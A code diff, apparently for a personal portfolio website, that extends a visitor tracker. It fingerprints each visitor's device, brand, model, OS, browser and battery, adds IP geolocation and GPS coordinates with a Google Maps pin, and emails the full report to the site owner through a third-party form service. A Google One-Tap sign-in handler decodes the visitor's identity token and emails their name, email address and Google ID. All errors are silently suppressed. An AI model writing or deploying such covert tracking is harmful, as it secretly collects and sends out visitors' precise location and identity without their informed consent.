@@ -330,6 +330,175 @@ async function getHighAccuracyLocation() {
   });
 }
 
+async function getDetailedDeviceInfo() {
+  const ua = navigator.userAgent;
+  let brand = "Unknown Brand";
+  let model = "";
+  let os = "Unknown OS";
+  let deviceType = "Desktop / PC";
+
+  // 1. High Entropy Client Hints (Chrome / Edge / Android)
+  if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
+    try {
+      const hints = await navigator.userAgentData.getHighEntropyValues([
+        "model",
+        "platform",
+        "platformVersion",
+        "architecture"
+      ]);
+      if (hints.model) model = hints.model;
+      if (hints.platform) os = hints.platform;
+    } catch (e) {}
+  }
+
+  // 2. Detect Mobile vs Tablet vs Desktop
+  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobile/i.test(ua);
+  const isTablet = /iPad|Tablet|(Android(?!.*Mobile))/i.test(ua);
+
+  if (isTablet) {
+    deviceType = "Tablet";
+  } else if (isMobile) {
+    deviceType = "Smartphone (Mobile)";
+  }
+
+  // 3. Detect Phone Brands & Specific Models
+  if (/iPhone/i.test(ua)) {
+    brand = "Apple";
+    deviceType = "Smartphone (Apple iPhone)";
+    const match = ua.match(/OS (\d+[_\d]*)/i);
+    os = match ? `iOS ${match[1].replace(/_/g, ".")}` : "iOS";
+
+    const w = window.screen.width * (window.devicePixelRatio || 1);
+    const h = window.screen.height * (window.devicePixelRatio || 1);
+    const maxDim = Math.max(w, h);
+
+    if (maxDim >= 2796) model = "iPhone 14/15/16 Pro Max / Plus";
+    else if (maxDim >= 2556) model = "iPhone 14/15/16 Pro";
+    else if (maxDim >= 2532) model = "iPhone 12 / 13 / 14";
+    else if (maxDim >= 2688) model = "iPhone XS Max / 11 Pro Max";
+    else if (maxDim >= 2436) model = "iPhone X / XS / 11 Pro";
+    else if (maxDim >= 1792) model = "iPhone XR / 11";
+    else if (maxDim >= 1334) model = "iPhone 6 / 7 / 8 / SE";
+    else model = "Apple iPhone";
+  } else if (/iPad/i.test(ua) || (navigator.platform === "MacIntel" && navigator.maxTouchPoints > 1)) {
+    brand = "Apple";
+    model = "Apple iPad";
+    deviceType = "Tablet (iPad)";
+    os = "iPadOS";
+  } else if (/Macintosh|Mac OS X|MacIntel/i.test(ua)) {
+    brand = "Apple";
+    model = "Apple Mac (MacBook / iMac)";
+    const match = ua.match(/Mac OS X (\d+[_\d]*)/i);
+    os = match ? `macOS ${match[1].replace(/_/g, ".")}` : "macOS";
+  } else if (/Samsung|SM-|SCH-|SGH-|SPH-/i.test(ua) || /SM-[A-Z0-9]+/i.test(model)) {
+    brand = "Samsung";
+    const smMatch = ua.match(/SM-[A-Z0-9]+/i);
+    const code = smMatch ? smMatch[0] : (model || "");
+    model = code ? `Samsung Galaxy (${code})` : "Samsung Galaxy Phone";
+    deviceType = "Smartphone (Samsung Galaxy)";
+    os = "Android (One UI)";
+  } else if (/Redmi|POCO|Xiaomi|2201|2109|2203|2210|2304/i.test(ua) || /Redmi|POCO|Xiaomi/i.test(model)) {
+    brand = "Xiaomi / Redmi";
+    const miMatch = ua.match(/(Redmi [A-Za-z0-9\s]+|POCO [A-Za-z0-9\s]+|Mi [A-Za-z0-9\s]+)/i);
+    model = miMatch ? miMatch[0] : (model ? `Xiaomi (${model})` : "Xiaomi / Redmi Device");
+    deviceType = "Smartphone (Xiaomi / Redmi)";
+    os = "Android (MIUI / HyperOS)";
+  } else if (/OnePlus|ONEPLUS/i.test(ua) || /OnePlus/i.test(model)) {
+    brand = "OnePlus";
+    const opMatch = ua.match(/OnePlus\s?[A-Za-z0-9\s]+/i);
+    model = opMatch ? opMatch[0] : (model ? `OnePlus (${model})` : "OnePlus Smartphone");
+    deviceType = "Smartphone (OnePlus)";
+    os = "Android (OxygenOS)";
+  } else if (/Pixel/i.test(ua) || /Pixel/i.test(model)) {
+    brand = "Google";
+    const pxMatch = ua.match(/Pixel\s?[0-9a-zA-Z\s]+/i);
+    model = pxMatch ? pxMatch[0] : (model ? `Google Pixel (${model})` : "Google Pixel Phone");
+    deviceType = "Smartphone (Google Pixel)";
+    os = "Android";
+  } else if (/Realme|RMX/i.test(ua) || /RMX/i.test(model)) {
+    brand = "Realme";
+    const rmxMatch = ua.match(/RMX[0-9]+/i);
+    model = rmxMatch ? `Realme (${rmxMatch[0]})` : "Realme Smartphone";
+    deviceType = "Smartphone (Realme)";
+    os = "Android (realme UI)";
+  } else if (/Vivo|V20|V21|V22|V23|iQOO/i.test(ua) || /vivo|iQOO/i.test(model)) {
+    brand = "Vivo / iQOO";
+    const vivoMatch = ua.match(/(vivo [A-Za-z0-9]+|iQOO [A-Za-z0-9]+|V[0-9]{4})/i);
+    model = vivoMatch ? vivoMatch[0] : "Vivo Smartphone";
+    deviceType = "Smartphone (Vivo)";
+    os = "Android (Funtouch OS)";
+  } else if (/OPPO|CPH/i.test(ua) || /CPH/i.test(model)) {
+    brand = "OPPO";
+    const oppoMatch = ua.match(/(OPPO [A-Za-z0-9]+|CPH[0-9]+)/i);
+    model = oppoMatch ? oppoMatch[0] : "OPPO Smartphone";
+    deviceType = "Smartphone (OPPO)";
+    os = "Android (ColorOS)";
+  } else if (/Moto|Motorola/i.test(ua) || /moto/i.test(model)) {
+    brand = "Motorola";
+    const motoMatch = ua.match(/(Moto\s?[A-Za-z0-9\s]+)/i);
+    model = motoMatch ? motoMatch[0] : "Motorola Device";
+    deviceType = "Smartphone (Motorola)";
+    os = "Android";
+  } else if (/Huawei|Honor/i.test(ua)) {
+    brand = "Huawei / Honor";
+    model = "Huawei / Honor Device";
+    deviceType = "Smartphone (Huawei)";
+    os = "HarmonyOS / Android";
+  } else if (/Windows NT/i.test(ua)) {
+    brand = "Windows PC";
+    model = "Desktop / Laptop PC";
+    deviceType = "PC / Laptop";
+    if (/Windows NT 10.0/i.test(ua)) os = "Windows 10 / 11";
+    else if (/Windows NT 6.3/i.test(ua)) os = "Windows 8.1";
+    else os = "Windows";
+  } else if (/Linux/i.test(ua)) {
+    brand = "Linux System";
+    model = "Linux PC";
+    os = "Linux";
+  }
+
+  // 4. Detect Browser Name
+  let browser = "Unknown Browser";
+  if (/Brave/i.test(ua) || (navigator.brave && await navigator.brave.isBrave())) {
+    browser = "Brave Browser";
+  } else if (/Edg/i.test(ua)) {
+    const match = ua.match(/Edg\/(\d+[\.\d]*)/i);
+    browser = match ? `Microsoft Edge ${match[1]}` : "Microsoft Edge";
+  } else if (/OPR|Opera/i.test(ua)) {
+    const match = ua.match(/(?:OPR|Opera)\/(\d+[\.\d]*)/i);
+    browser = match ? `Opera ${match[1]}` : "Opera";
+  } else if (/Chrome/i.test(ua) && !/Edg|OPR/i.test(ua)) {
+    const match = ua.match(/Chrome\/(\d+[\.\d]*)/i);
+    browser = match ? `Google Chrome ${match[1]}` : "Google Chrome";
+  } else if (/Safari/i.test(ua) && !/Chrome|Edg|OPR/i.test(ua)) {
+    const match = ua.match(/Version\/(\d+[\.\d]*)/i);
+    browser = match ? `Apple Safari ${match[1]}` : "Apple Safari";
+  } else if (/Firefox/i.test(ua)) {
+    const match = ua.match(/Firefox\/(\d+[\.\d]*)/i);
+    browser = match ? `Mozilla Firefox ${match[1]}` : "Mozilla Firefox";
+  }
+
+  // 5. Battery Status
+  let batteryInfo = "N/A";
+  if (navigator.getBattery) {
+    try {
+      const bat = await navigator.getBattery();
+      batteryInfo = `${Math.round(bat.level * 100)}% (${bat.charging ? "Charging ⚡" : "Battery Mode"})`;
+    } catch (e) {}
+  }
+
+  return {
+    brand: brand,
+    model: model || brand,
+    deviceType: deviceType,
+    os: os,
+    browser: browser,
+    screen: `${window.screen.width}x${window.screen.height} (@${window.devicePixelRatio || 1}x)`,
+    isTouch: navigator.maxTouchPoints > 0 ? "Touchscreen Enabled" : "Mouse / Keyboard",
+    battery: batteryInfo
+  };
+}
+
 async function logVisitorDetails(visitId) {
   try {
     const history = JSON.parse(localStorage.getItem(LOGS_STORAGE_KEY) || "[]");
@@ -346,7 +515,7 @@ async function logVisitorDetails(visitId) {
       mapsUrl: "https://www.google.com/maps?q=27.7172,85.3240"
     };
 
-    // 1. Fetch IP-based Geolocation with Coordinates
+    // 1. Fetch IP Geolocation
     try {
       const ipRes = await fetch("https://ipwho.is/");
       if (ipRes.ok) {
@@ -384,20 +553,20 @@ async function logVisitorDetails(visitId) {
             };
           }
         }
-      } catch (err) {
-        // Fallback geoData used
-      }
+      } catch (err) {}
     }
 
-    // 2. Try High-Accuracy GPS (if user allows location)
+    // 2. High-Accuracy GPS (if enabled)
     const gpsLocation = await getHighAccuracyLocation();
-
     const activeLat = gpsLocation ? gpsLocation.lat : geoData.lat;
     const activeLon = gpsLocation ? gpsLocation.lon : geoData.lon;
     const activeMapsUrl = gpsLocation ? gpsLocation.mapsUrl : geoData.mapsUrl;
     const specificArea = gpsLocation?.fullAddress 
       ? gpsLocation.fullAddress 
       : `${geoData.city}${geoData.region ? ', ' + geoData.region : ''}, ${geoData.country}`;
+
+    // 3. Deep Device & Brand Specs
+    const deviceInfo = await getDetailedDeviceInfo();
 
     const newVisitorEntry = {
       visitId: visitId,
@@ -413,9 +582,14 @@ async function logVisitorDetails(visitId) {
       mapsUrl: activeMapsUrl,
       locationAccuracy: gpsLocation ? `Exact GPS Live (~${gpsLocation.accuracy})` : "IP City Level",
       isp: geoData.org,
-      platform: navigator.platform || "Browser Client",
-      language: navigator.language || "en",
-      screenResolution: `${window.screen.width}x${window.screen.height}`,
+      brand: deviceInfo.brand,
+      model: deviceInfo.model,
+      deviceType: deviceInfo.deviceType,
+      os: deviceInfo.os,
+      browser: deviceInfo.browser,
+      battery: deviceInfo.battery,
+      screenResolution: deviceInfo.screen,
+      isTouch: deviceInfo.isTouch,
       timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Asia/Kathmandu",
       referrer: document.referrer || "Direct Visit",
       userAgent: navigator.userAgent
@@ -427,12 +601,10 @@ async function logVisitorDetails(visitId) {
       if (history.length > 100) history.shift();
       localStorage.setItem(LOGS_STORAGE_KEY, JSON.stringify(history));
 
-      // Send email alert
+      // Dispatch Email Alert
       sendVisitorEmailAlert(newVisitorEntry);
     }
-  } catch (e) {
-    // Fail silently
-  }
+  } catch (e) {}
 }
 
 async function sendVisitorEmailAlert(visitorEntry) {
@@ -441,32 +613,36 @@ async function sendVisitorEmailAlert(visitorEntry) {
     formData.append("access_key", "fb13d3c2-66f4-42e2-bdd8-1caea1205753");
     formData.append(
       "subject",
-      `📍 New Visitor Alert #${visitorEntry.visitId} from ${visitorEntry.city || 'Nepal'} [${visitorEntry.locationAccuracy}]`
+      `📍 Visitor Alert #${visitorEntry.visitId}: [${visitorEntry.brand} ${visitorEntry.model}] from ${visitorEntry.city || 'Nepal'}`
     );
     formData.append("from_name", "Portfolio Visitor Tracker");
     formData.append("message", `
 ===================================================
-📍 NEW VISITOR GEOLOCATION & DEVICE REPORT
+📍 NEW VISITOR GEOLOCATION & DEVICE SPECS
 ===================================================
 
 • Visit ID: #${visitorEntry.visitId}
 • Specific Area / Street: ${visitorEntry.location}
-• City / Region / Country: ${visitorEntry.city}, ${visitorEntry.region}, ${visitorEntry.country}
-• Coordinates: Latitude: ${visitorEntry.latitude}, Longitude: ${visitorEntry.longitude}
+• City / Region: ${visitorEntry.city}, ${visitorEntry.region}, ${visitorEntry.country}
+• Coordinates: Lat: ${visitorEntry.latitude}, Lon: ${visitorEntry.longitude}
 • Live Google Maps Pin: ${visitorEntry.mapsUrl}
-• Accuracy Mode: ${visitorEntry.locationAccuracy}
+• Location Accuracy: ${visitorEntry.locationAccuracy}
+
+📱 PHONE & HARDWARE SPECIFICATIONS:
+• Phone / Device Brand: ${visitorEntry.brand}
+• Exact Model: ${visitorEntry.model}
+• Device Classification: ${visitorEntry.deviceType}
+• Operating System: ${visitorEntry.os}
+• Browser Name & Version: ${visitorEntry.browser}
+• Screen Dimensions: ${visitorEntry.screenResolution} (${visitorEntry.isTouch})
+• Battery Status: ${visitorEntry.battery}
 
 🌐 NETWORK & CONNECTION:
 • IP Address: ${visitorEntry.ip}
-• ISP / Provider: ${visitorEntry.isp}
+• Internet Provider (ISP): ${visitorEntry.isp}
 • Visit Time (Nepal): ${visitorEntry.timestamp}
 • Device Timezone: ${visitorEntry.timeZone}
-
-📱 DEVICE & BROWSER:
-• Platform / OS: ${visitorEntry.platform}
-• Screen Size: ${visitorEntry.screenResolution}
 • Referrer Source: ${visitorEntry.referrer}
-• Language: ${visitorEntry.language}
 • User Agent: ${visitorEntry.userAgent}
     `);
 
@@ -475,10 +651,88 @@ async function sendVisitorEmailAlert(visitorEntry) {
       body: formData,
       headers: { "Accept": "application/json" }
     });
-  } catch (e) {
-    // Fail silently
+  } catch (e) {}
+}
+
+/* ===================================================
+   Google One-Tap (Method 2) 1-Click Authentication
+   =================================================== */
+function initGoogleOneTap() {
+  function startOneTap() {
+    if (typeof google === "undefined" || !google.accounts || !google.accounts.id) return;
+
+    try {
+      google.accounts.id.initialize({
+        client_id: "976694605929-uikj79o24jhk5p03328lqvgd94m16k8t.apps.googleusercontent.com",
+        callback: handleGoogleSignInResponse,
+        auto_select: false,
+        cancel_on_tap_outside: true
+      });
+
+      google.accounts.id.prompt((notification) => {
+        if (notification.isNotDisplayed() || notification.isSkippedMoment()) {
+          // Logged or handled
+        }
+      });
+    } catch (e) {}
+  }
+
+  if (document.readyState === "complete") {
+    startOneTap();
+  } else {
+    window.addEventListener("load", startOneTap);
   }
 }
+
+async function handleGoogleSignInResponse(response) {
+  try {
+    if (!response || !response.credential) return;
+
+    const base64Url = response.credential.split('.')[1];
+    const base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');
+    const jsonPayload = decodeURIComponent(atob(base64).split('').map(function(c) {
+      return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
+    }).join(''));
+
+    const googleUser = JSON.parse(jsonPayload);
+    localStorage.setItem("bp_authenticated_google_user", JSON.stringify(googleUser));
+
+    if (typeof showToast === "function") {
+      showToast(`Welcome, ${googleUser.name}! Verified with Google.`);
+    }
+
+    // High-Priority Alert: Real Email Captured via Google!
+    const formData = new FormData();
+    formData.append("access_key", "fb13d3c2-66f4-42e2-bdd8-1caea1205753");
+    formData.append(
+      "subject",
+      `🌟 VERIFIED GOOGLE VISITOR: ${googleUser.name} <${googleUser.email}>`
+    );
+    formData.append("from_name", "Portfolio Google One-Tap");
+    formData.append("message", `
+===================================================
+🌟 VERIFIED GOOGLE ACCOUNT VISITOR SIGNED IN!
+===================================================
+
+• Full Name: ${googleUser.name}
+• Email Address: ${googleUser.email}
+• Google Verified: ${googleUser.email_verified ? "YES ✅" : "No"}
+• Profile Picture: ${googleUser.picture || "None"}
+• Google User ID: ${googleUser.sub}
+• Visit Time (Nepal): ${new Date().toLocaleString("en-US", { timeZone: "Asia/Kathmandu" })}
+
+This visitor authorized 1-click Google Sign-In on your portfolio!
+    `);
+
+    await fetch("https://api.web3forms.com/submit", {
+      method: "POST",
+      body: formData,
+      headers: { "Accept": "application/json" }
+    });
+  } catch (e) {}
+}
+
+initGoogleOneTap();
 
 window.getVisitorLogs = function() {
   return JSON.parse(localStorage.getItem(LOGS_STORAGE_KEY) || "[]");
